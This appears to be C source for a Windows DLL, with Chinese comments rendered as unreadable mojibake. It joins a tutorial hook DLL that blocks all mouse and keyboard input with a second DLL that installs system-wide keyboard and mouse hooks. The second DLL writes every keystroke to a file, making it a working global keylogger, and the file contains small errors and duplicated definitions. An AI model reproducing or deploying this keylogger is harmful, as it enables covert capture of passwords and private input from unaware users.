/* 
   �����д�������̬���ӿ�(DLL)�����õ���WIN32 DLL��������MFC DLL����ΪWIN32 API�ܹ�����ϸ����ȫ��
   �Ŀ��Ƴ�������ִ�У���ʹ��MFC��һЩ�ͼ��Ŀ����ǲ�����ʵ�ֵġ�
   ˵�������ӽ�����һЩ������һ�������ϵ�һЩ��������˹��ӽ���ֻ��WINDOWS���ö�����Ӧ�ó�����á�
   ����˵����nCode �����Ӵ��룬���ӽ���ʹ�ù��Ӵ���ȥ�����Ƿ�ִ�У������Ӵ����ֵ�������ӵ����������ġ�
   ÿ�ֹ������඼�������Լ�һϵ�����ԵĴ��롣�������WH_KEYBOARD�����Ӵ���Ĳ����У�HC_ACTION��HC_NOREMOVE.
   HC_ACTION�����壺����wParam ��lParam �����˼����ô���Ϣ����Ϣ��HC_NOREMOVE�����壺����wParam ��lParam�����˼����ô���Ϣ����Ϣ��
   ���ң������ô���Ϣһֱû�д���Ϣ������ɾ����Ҳ����˵��nCode����HC_ACTIONʱ�����ӽ��̱��봦����Ϣ����ΪHC_NOREMOVEʱ��
   ���ӽ��̱��봫����Ϣ��CallNextHookEx����������������һ���Ĵ������ұ�����CallNextHookEx�����ķ���ֵ��

   ע�⣺������ӽ�����nCodeС���㣬���ӽ��̱��뷵�� ��return  CallNextHookEx(nCode��wParam��lParam); 
   ��Ҫ�ǹ��ӽ����е�nCode�����㣬���ǹ��ӽ��̲���������Ϣ����ʱ�Ƽ������CallNextHookEx���ҷ��ظú����ķ���ֵ��
   ֵ�����������һ��Ӧ�ó���Ҳװ��WH_KEYBOARD ���ӣ���ô�ù��ӽ������ܹ���֪ͨ���ҷ���һ������ȷ��ֵ��������ӽ��̴�������Ϣ��
   �����ܷ���һ������ֵȥ��ֹϵͳ���ݸ���Ϣ������ʣ�µĹ��ӻ���windows���̡���������ڹ��ӽ��̵���󶼷���CallNextHookEx�ķ���ֵ��
   CallNexHookEx()�������ڶԵ�ǰ�������е���һ�����ӽ��̴��ݹ�����Ϣ��һ�����ӽ��̼ȿ����ڹ�����Ϣ����ǰ��Ҳ�����ڹ�����Ϣ��������
   �ú������ú����ķ���ֵ����һ�����ӽ��̷��ص�ֵ����ǰ���ӽ��̱��뷵�����ֵ������ֵ�ľ��庬����ҽӵĹ��������йء�
/////////////////////////////////////////

#include <windows.h>
#include <string.h>
#include <stdio.h>

/*
����ȫ�ֱ�����g_hMouse��g_hKeyboard�������氲װ����깳�Ӿ���ͼ��̹��Ӿ����
g_hWnd����������ø�DLL�Ľ��̵������ھ����

����ע�⣬�����DLL�ᱻ�������ʹ��ʱ����Щ���̿��Թ���DLL�Ĵ�������ݣ���������������Ƕ����ȫ�־��������g_hWnd
��Ӧ���Ǳ����н���������ģ������Ļ������л����������̴��ں󣬵�����SengMessage��g_hWnd����ʾ�Ľ��̷���һ��WM_CLOSE
��Ϣʱ�����ø�DLL�Ŀͻ�����Ӧ��Ҳ���˳�������ʵû�У�������Ϊ�����������̿��Թ���ͬһ�ݿ�д������ݵĻ��������ɺ�
���صĺ����Ϊ�˽��������⣬Windows 2000������д��ʱ���ƻ��ƣ�����DLL��һ�����ݿ��Ա�������������������ڶ����������޸�
DLL����ҳ��2�ϵ�����ʱ������ϵͳ�����һ����ҳ�棬��������ҳ��2�ϵ����ݸ���һ�ݵ������ҳ���ϣ�ͬʱ����Ͽ�����ҳ��2 ����2
���������ݿռ��ӳ�䣬���µ�ҳ��ӳ�䵽�ڶ������̵�ַ�ռ䣬����һ�������еõ�����Ȼ��ԭʼ���ݡ������д��ʱ���ƻ��ƣ������ڸ�
������֮ǰ������������Ȼ�ǹ���ͬһ�����ݡ����Ҷ���һ��ֻ��������˵��Ҳ���ڶ�����̼乲��ġ�

����û�ϣ����HookTest��������ʱ����ʹ�л����������̵�����£�����F2��Ҳ��ʹHookTest�����˳�������ԣ�ΪHook.dll����һ���µ�
�ڣ������˽�����Ϊһ������Ľڣ�Ȼ��ȫ�ֱ��� g_hWnd �ŵ��˽��У��ø�ȫ�ֱ����ڶ�����̼乲��
/////////////////////////////////////////////

HINSTANCE hInst;
HHOOK g_hMouse=NULL;
HHOOK g_hKeyboard=NULL;

/*
�� g_hWnd �����ڽ����棺�����ַ����� MySec�������´����Ľڵ����ƣ�ע������ַ�������󳤶�����Ϊ8����
һ���½ڵĶ������������#pragma data_seg()�����������½ڵĽ�β�����б���Ҫ��ʼ��������з��õı�����
����������Ҫ��MySec������Ϊ����Ľڣ�֮�������̲��ܹ���������е����ݣ������ַ���������һ��Ҫ�õ�ָ�
#pragma comment,��־��RWS�����Ƕ���д���������ͣ��籾����ʾ��
��MySec������Ϊ����Ľڣ�����������������DLL��ģ�鶨���ļ�������SEGMENTS�ؼ�����ʵ�֣����巽�����ڸùؼ���
��д�Ͻڵ����ƣ�����ָ���ڵ����ԣ�����ڱ���������Hook.def �ļ�����������֮��������´��룺
SEGMENTS
MySec READ WRITE SHARED
// HWND  g_hWnd=NULL; 
////////////////////////////////////////////////  

#pragma data_seg("MySec")
HWND g_hWnd=NULL;
#pragma data_seg()
#pragma  comment(linker, "/section:MySec,RWS")

// ��깳�ӹ��̣��ù���ֱ�ӷ���һ����0ֵ����ʾ�������Ϣ�Ѿ������ˣ�Ҳ���Ǹù��ӽ��������е������Ϣ
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
return 1;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
if(VK_F2==wParam)
{
SendMessage(g_hWnd, WM_CLOSE, 0, 0); // ����ý��̵������ھ������WM_CLOSE��Ϣ���õ��ý����˳������Ƴ�����װ�Ĺ���
UnhookWindowsHookEx(g_hMouse);
UnhookWindowsHookEx(g_hKeyboard);
}
return 1;
}
/* ���尲װ��깳�ӹ��̺��������ĸ�����Ϊ0��������װ�Ĺ��ӹ��̾ͺ�������ͬһ�����ϵ����н�������ˡ�
����������Ҫ��ָ����װ���ӹ������ڵ�DLLģ��ľ���������ַ������Եõ���һ��ΪDLL�����ṩһ��DllMain����
����һ�μ���DLLʱ��ϵͳ�����������������Ҵ��ݵ�ǰDLLģ��ľ������˿�����Hook��һDLL���ṩһ����̬����
����ں�����DllMain��������һ��ȫ�ֵ�ʵ��������g_hInst��Ȼ����DLL�����б���ϵͳ������DLLģ������
////////////////////////////////////////////////

HINSTANCE g_hInst;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdReason, LPVOID lpvReserved)
{
g_hInst=hinstDLL;
return TRUE;
}

/*��һ�ֻ��DLLģ�����ķ���������GetModuleHandle�������õ�ָ����DLLģ���������ָ����ģ���Ѿ���ӳ�䵽��ǰ
���̵ĵ�ַ�ռ䣬��ô�ú��������ظ�ģ��ľ����GetModuleHandle�����Ĳ�����һ���ַ�����ָ������Ҫ��ȡ��ģ����
ģ�����ƣ���ģ�������һ��.exe �ļ���Ҳ������.Dll�ļ�������ָ����չ����ϵͳ�Զ������.dllΪ����չ��������ֵ��
HMODULE ���ͣ�����HMODULE��HINSTANCE����ͨ�á�
///////////////////////////////////////////////////

void SetHook(HWND hwnd)
{
g_hWnd=hwnd;
g_hMouse=SetWindowsHookEx(WH_MOUSE, MouseProc, GetModuleHandle("Hook"),0);
g_hKeyboard=SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle("Hook"), 0);
}

/*
Ȼ��ΪHook�������һ��ģ�鶨���ļ���������ѡ��File\New...���ϵ�Text File��������Ϊ��Hook.def,���£�

LIBRARY Hook   : �����ָ��DLL�ڲ����ơ�
EXPORTS        : ��EXPORTS�ؼ���ָ����DLL�������������ƣ�SetHook��
SetHook @2     : @2�Ǵ�DLL�е����ĺ�������ţ���������ָ����Ŷ�����ʹ��ϵͳ���ŵ���ţ����������Ӷ��壺 @ + ��š�
////////////////////////////////////////

/*
��������Щ�������֮�󣬾Ϳ��Ա�дһ���ͻ��˳������Dll��Ȼ����ø�DLL�ṩ��SetHook�������Ӷ�������һ���뵱ǰ���н�����ص�ȫ�ֹ��ӣ�������
һ�������е�ĳ���̸߳�һ�����ڷ�����Ϣʱ������ϵͳ�ͻ����������߳��Ƿ��Ѿ���װ�˹��ӹ��̣����ᷢ�ָ��߳��Ѿ���װ��һ��ȫ�ֵĹ��ӹ��̣�
���Ǿ�Ҫ�ҵ�����������ӵ�DLL�������DLLӳ�䵽�ý��̵ĵ�ַ�ռ��У���������Ӧ�Ĺ��ӹ��̺�����Ȼ�������Ϣ���ݸ��ù��ӹ��̡�
*/

#include <windows.h>
#include <stdio.h>
#include <string> 
using std::string;

#define DLL_API  _declspec(dllexport)
#include "Hook.h"

HINSTANCE g_hInst;     // ȫ�ֵ�ʵ������
// HWND  g_hWnd=NULL;         // ����Ӧ�ó��򴰿ھ��
FILE * pFile=NULL;

#pragma data_seg("hookdata")  //�´��������������Խ��̹������

HHOOK g_hKeyboard=NULL;
HHOOK g_hMouse=NULL;       // ���氲װ����깳�Ӿ��
HWND g_pretarwnd=NULL;     // �ϴ������ָ�Ĵ��ھ��
HWND g_displayrwnd=NULL;  // ��ʾĿ�괰�ڱ���༭��ľ��

#pragma data_seg()

#pragma  comment(linker, "/SECTION:hookdata,RWS")  // ����Ϊ����

/*һ��DLL����ӵ�е�������㺯����ϵͳ�ڲ�ͬ��ʱ������������㺯�����������DllMain������������ÿ��������ṩ
  һЩ��Ϣ��ͨ�����ڹ�DLL����ÿ�����̻��̵߳ĳ�ʼ�������������������DLL����Ҫ��Щ֪ͨ��Ϣ���Ͳ�����DLLԴ������
  ʵ����������������Ҫ����Ӧʵ�������������Windowsϵͳ���Զ��Ƚ��뵽���������ʼִ�С�������õĽ���㺯������
  DllMain�����Ǳ�ĺ�������������ܱ������ӣ�������Ľ���㺯����Զ���ᱻ���ã����DLL��Զ���ᱻ��ʼ����
  DLLʹ��DllMain������DllMain�����Ĳ������г�ʼ�������ԣ������DllMain����ִ��ʱ��ͬһ����ַ�ռ��е�����DLL������
  Ϊ��ʼ�������Ӧ�ñ�����ô�����DLL������ĺ��������⣬Ӧ�ñ����DllMain�ڲ�����LoadLibrary��FreeLibrary��������Ϊ��
  Щ�������γ�һ��������ѭ�������⣬�������ȫ���ԵĻ�̬��C++����Ӧ��ע����ܴ���ͬ�������⣬��Ϊ�������DllMain������ͬʱ
  ����Щ��������������͹��캯��Ҳ�ᱻ���á�*/
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
    switch(dwReason)           // dwReason ����ָ��ϵͳΪʲô���øú��������������ĸ�ֵ��
    {
	case DLL_PROCESS_ATTACH:  // The DLL is being mapped into the process's address space
	    g_hInst=hinstDLL;     // ����hinstDLL������DLL��ʵ����������ڱ��DLL���ļ�ӳ�䱻ӳ�䵽���̵ĵ�ַ�ռ�
	    break;                // �е������ڴ��ַ�����䱣����һ��ȫ�ֱ����У������ڼ�����Դ����ʱʹ������

	case DLL_PROCESS_DETACH: // The DLL is being unmapped from the process's address space
	    break;
	case DLL_THREAD_ATTACH:  //�����Ѵ���һ���µ��߳�
	    break;
	case DLL_THREAD_DETACH:  //������������һ���߳�
	    break;
    }

    return TRUE;
}

// ��깳�ӹ��̣��ù���ֱ�ӷ���һ����0ֵ����ʾ�������Ϣ�Ѿ������ˣ�Ҳ���Ǹù��ӽ��������е������Ϣ
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // 	 LPMOUSEHOOKSTRUCT pMouseHooK=(MOUSEHOOKSTRUCT FAR *)lParam;
    // 	 if (nCode>0)
    // 	 {
    // 		 HWND g_targetwnd=pMouseHooK->hwnd; // ȡĿ�괰�ھ��
    // 		 HWND ParentWnd=g_targetwnd;
    // 		 while (ParentWnd!=NULL)
    // 		 {
    // 			 g_targetwnd=ParentWnd;
    // 			 ParentWnd=GetParent(g_targetwnd); // ȡ��Ӧ�ó��������ڵľ��
    // 		 }
    // 		 if(g_targetwnd != g_pretarwnd)
    // 		 {
    // 			 char szCaption[100];
    // 			 GetWindowText(g_targetwnd,szCaption,100); // ȡ��Ŀ�괰�ڱ���
    // 			 
    // 			 if (strlen(szCaption))
    // 			 {
    // 				 string strtitle=szCaption; 
    // 				 fprintf(pFile,"%s ",strtitle);	
    // 			 }				 
    // 		
    // 			 g_pretarwnd=g_targetwnd;             // ����Ŀ�괰��
    // 
    // 		 }
    // 
    // 	 }

    return  CallNextHookEx(g_hMouse, nCode, wParam, lParam); // ����������Ϣ
}

LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if(lParam & 0x80000000) // �жϼ����Ƿ񱻰���
    {	

	switch(wParam)
	{
	    // ESC F1~F12
	    case VK_ESCAPE: fprintf(pFile,"%s","ESCAPE ");break;
	    case VK_F1:     fprintf(pFile,"%s","F1 ");break;
	    case VK_F2:     fprintf(pFile,"%s","F2 ");break;
	    case VK_F3:     fprintf(pFile,"%s","F3 ");break;
	    case VK_F4:     fprintf(pFile,"%s","F4 ");break;
	    case VK_F5:     fprintf(pFile,"%s","F5 ");break;
	    case VK_F6:     fprintf(pFile,"%s","F6 ");break;
	    case VK_F7:     fprintf(pFile,"%s","F7 ");break;
	    case VK_F8:     fprintf(pFile,"%s","F8 ");break;
	    case VK_F9:     fprintf(pFile,"%s","F9 ");break;
	    case VK_F10:    fprintf(pFile,"%s","F10 ");break;
	    case VK_F11:    fprintf(pFile,"%s","F11 ");break;
	    case VK_F12:    fprintf(pFile,"%s","F12 ");break;
			    // 0~9
	    case '1':      fprintf(pFile,"%2d",1);break;
	    case '2':      fprintf(pFile,"%2d",2);break;
	    case '3':      fprintf(pFile,"%2d",3);break;
	    case '4':      fprintf(pFile,"%2d",4);break;
	    case '5':      fprintf(pFile,"%2d",5);break;
	    case '6':      fprintf(pFile,"%2d",6);break;
	    case '7':      fprintf(pFile,"%2d",7);break;
	    case '8':      fprintf(pFile,"%2d",8);break;
	    case '9':      fprintf(pFile,"%2d",9);break;
	    case '0':      fprintf(pFile,"%2d",0);break;

	    case VK_NUMPAD1:   fprintf(pFile,"%s","NUMPAD1 ");break;
	    case VK_NUMPAD2:   fprintf(pFile,"%s","NUMPAD2 ");break;
	    case VK_NUMPAD3:   fprintf(pFile,"%s","NUMPAD3 ");break;
	    case VK_NUMPAD4:   fprintf(pFile,"%s","NUMPAD4 ");break;
	    case VK_NUMPAD5:   fprintf(pFile,"%s","NUMPAD5 ");break;
	    case VK_NUMPAD6:   fprintf(pFile,"%s","NUMPAD6");break;
	    case VK_NUMPAD7:   fprintf(pFile,"%s","NUMPAD7 ");break;
	    case VK_NUMPAD8:   fprintf(pFile,"%s","NUMPAD8 ");break;
	    case VK_NUMPAD9:   fprintf(pFile,"%s","NUMPAD9 ");break;
	    case VK_NUMPAD0:   fprintf(pFile,"%s","NUMPAD0 ");break;
			       // A~Z
	    case 'A':  fprintf(pFile,"%s", "A ");break;
	    case 'B':  fprintf(pFile,"%s", "B ");break;
	    case 'C':  fprintf(pFile,"%s", "C ");break;
	    case 'D':  fprintf(pFile,"%s", "D ");break;
	    case 'E':  fprintf(pFile,"%s", "E ");break;
	    case 'F':  fprintf(pFile,"%s", "F ");break;
	    case 'G':  fprintf(pFile,"%s", "G ");break;
	    case 'H':  fprintf(pFile,"%s", "H ");break;
	    case 'I':  fprintf(pFile,"%s", "I ");break;
	    case 'J':  fprintf(pFile,"%s", "G ");break;
	    case 'K':  fprintf(pFile,"%s", "K ");break;
	    case 'L':  fprintf(pFile,"%s", "L ");break;
	    case 'M':  fprintf(pFile,"%s", "M ");break;
	    case 'N':  fprintf(pFile,"%s", "N ");break;
	    case 'O':  fprintf(pFile,"%s", "O ");break;
	    case 'P':  fprintf(pFile,"%s", "P ");break;
	    case 'Q':  fprintf(pFile,"%s", "Q ");break;
	    case 'R':  fprintf(pFile,"%s", "R ");break;
	    case 'S':  fprintf(pFile,"%s", "S ");break;
	    case 'T':  fprintf(pFile,"%s", "T ");break;
	    case 'U':  fprintf(pFile,"%s", "U ");break;
	    case 'V':  fprintf(pFile,"%s", "V ");break;
	    case 'W':  fprintf(pFile,"%s", "W ");break;
	    case 'X':  fprintf(pFile,"%s", "X ");break;
	    case 'Y':  fprintf(pFile,"%s", "Y ");break;
	    case 'Z':  fprintf(pFile,"%s", "Z ");break;
		       // OTHER KEY
	    case VK_UP:    fprintf(pFile,"%s","UP ");break;
	    case VK_DOWN:  fprintf(pFile,"%s","DOWN ");break; //Alt
	    case VK_LEFT:  fprintf(pFile,"%s","LEFT ");break;
	    case VK_RIGHT: fprintf(pFile,"%s","RIGHT ");break;

	    case VK_TAB:   fprintf(pFile,"%s","TAB ");break;
	    case VK_MENU:  fprintf(pFile,"%s","MENU ");break;
	    case VK_SHIFT: fprintf(pFile,"%s","SHIFT ");break;
	    case VK_CONTROL:  fprintf(pFile,"%s","CONTROL ");break;

	    case VK_RETURN:  fprintf(pFile,"%s","RETURN ");break;
	    case VK_ACCEPT:  fprintf(pFile,"%s","ACCEPT ");break;
	    case VK_CLEAR:   fprintf(pFile,"%s","CLEAR ");break;
	    case VK_DELETE:  fprintf(pFile,"%s","DELETE ");break;
	    case VK_CANCEL:  fprintf(pFile,"%s","CANCEL ");break;
	    case VK_CONVERT: fprintf(pFile,"%s","CONVERT ");break;
	    case VK_DIVIDE:  fprintf(pFile,"%s","DIVIDE ");break;
	    case VK_END:     fprintf(pFile,"%s","END ");break;
	    case VK_FINAL:   fprintf(pFile,"%s","FINAL ");break;
	    case VK_HELP:    fprintf(pFile,"%s","HELP ");break;
	    case VK_HOME:    fprintf(pFile,"%s","HOME ");break;
	    case VK_INSERT:  fprintf(pFile,"%s","INSERT ");break;
	    case VK_KANA:    fprintf(pFile,"%s","KANA ");break;
	    case VK_KANJI:   fprintf(pFile,"%s","KANJI ");break;
	    case VK_MODECHANGE:  fprintf(pFile,"%s","MODECHANGE ");break;
	    case VK_MULTIPLY:    fprintf(pFile,"%s","MULTIPLY ");break;
	    case VK_NONCONVERT:  fprintf(pFile,"%s","NONCONVERT ");break;
	    case VK_PAUSE:   fprintf(pFile,"%s","PAUSE ");break;
	    case VK_SPACE:   fprintf(pFile,"%s","SPACE ");break;
	    case VK_LWIN:    fprintf(pFile,"%s","LWIN ");break;
	    case VK_CAPITAL: fprintf(pFile,"%s","CAPITAL ");break;
	    case VK_PRIOR:   fprintf(pFile,"%s","PRIOR ");break;
	    case VK_NEXT:    fprintf(pFile,"%s","NEXT ");break;
	}
	//����һЩ���ⰴ��
	char KeyName[50];
	ZeroMemory(KeyName,50);
	GetKeyNameText(lParam,KeyName,50);
	string KeyNameStr=KeyName;
	if(KeyNameStr=="`")
	    fprintf(pFile,"%s","` ");
	if(KeyNameStr=="-")
	    fprintf(pFile,"%s","- ");
	if(KeyNameStr=="=")
	    fprintf(pFile,"%s","= ");
	if(KeyNameStr=="\\")
	    fprintf(pFile,"%s","\\ ");
	if(KeyNameStr=="Backspace")
	    fprintf(pFile,"%s","Backspace ");
	if(KeyNameStr=="[")
	    fprintf(pFile,"%s","[ ");
	if(KeyNameStr=="]")
	    fprintf(pFile,"%s","] ");
	if(KeyNameStr==";")
	    fprintf(pFile,"%s","; ");
	if(KeyNameStr=="'")
	    fprintf(pFile,"%s","' ");
	if(KeyNameStr==",")
	    fprintf(pFile,"%s",", ");
	if(KeyNameStr==".")
	    fprintf(pFile,"%s",". ");
	if(KeyNameStr=="/")
	    fprintf(pFile,"%s","/ ");
	if(KeyNameStr=="Left Windows")
	    fprintf(pFile,"%s", "Left Windows ");
	if(KeyNameStr=="Right Windows")
	    fprintf(pFile,"%s", "Right Windows ");
	if(KeyNameStr=="Application")
	    fprintf(pFile,"%s", "Application ");
	if(KeyNameStr=="Scroll Lock")
	    fprintf(pFile,"%s", "Scroll Lock ");
	if(KeyNameStr==" Number Lock")
	    fprintf(pFile,"%s", "Number Lock ");
	if(KeyNameStr=="Number -")
	    fprintf(pFile,"%s","Number - ");
	if(KeyNameStr==" Number +")
	    fprintf(pFile,"%s","Number + ");
	if(KeyNameStr==" Number Del")
	    fprintf(pFile,"%s","Number Del ");	



    } 

    return CallNextHookEx(g_hKeyboard, nCode, wParam, lParam); 

}

void SetHook(HWND hwnd,FILE * pfile)
{
    // 	g_hWnd=hwnd;
    pFile=pfile;
    g_displayrwnd=hwnd;	 // ������ʾĿ�괰�ڱ���༭��ľ����
    g_hMouse=SetWindowsHookEx(WH_MOUSE, MouseProc, GetModuleHandle("Hook.dll"),0);
    g_hKeyboard=SetWindowsHookEx(WH_KEYBOARD, KeyBoardProc, GetModuleHandle("Hook.dll"), 0);
}

void UnSetHook()
{
    // SendMessage(g_hWnd, WM_CLOSE, 0, 0); // ����ý��̵������ھ������WM_CLOSE��Ϣ���õ��ý����˳������Ƴ�����װ�Ĺ���
    UnhookWindowsHookEx(g_hMouse);
    UnhookWindowsHookEx(g_hKeyboard);	

    g_hInst=NULL;     
    // 	g_hWnd=NULL; 
    g_hKeyboard=NULL;
    g_hMouse=NULL;    
    g_pretarwnd=NULL;     
    g_displayrwnd=NULL; 		

}


